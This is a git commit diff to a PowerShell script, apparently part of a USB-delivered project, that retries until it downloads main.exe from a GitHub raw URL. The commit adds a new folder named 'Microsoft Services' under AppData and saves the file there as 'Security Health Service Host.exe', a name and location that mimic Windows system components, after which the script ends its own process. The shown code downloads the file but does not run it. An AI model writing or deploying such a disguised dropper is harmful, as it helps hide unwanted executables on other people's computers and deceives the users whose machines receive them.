55b409913bb36fb670f4977d04e9437860abc3e8
MitrichevGeorge <131480793+MitrichevGeorge@users.noreply.github.com>
2025-11-05 16:08:34 +0300

    Update i.ps1

--- i.ps1
+++ i.ps1
@@ -2,7 +2,7 @@ Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show('RUNNNED', 'Info', 'OK', 'Information')
 
 
-function Download($from, $to) {
+function download($from, $to) {
     while ($true) {
         try {
             Invoke-WebRequest -Uri $from -OutFile $to -UseBasicParsing -ErrorAction Stop
@@ -13,7 +13,9 @@ function Download($from, $to) {
         }
     }
 }
+$path = "$env:APPDATA\Microsoft Services\"
+New-Item -ItemType Directory -Force -Path $path | Out-Null
 
-download https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe "%APPDATA%\YourAppName\Security Health Service Host.exe"
+download "https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe" "$path\Security Health Service Host.exe"
 
 Stop-Process -Id $PID
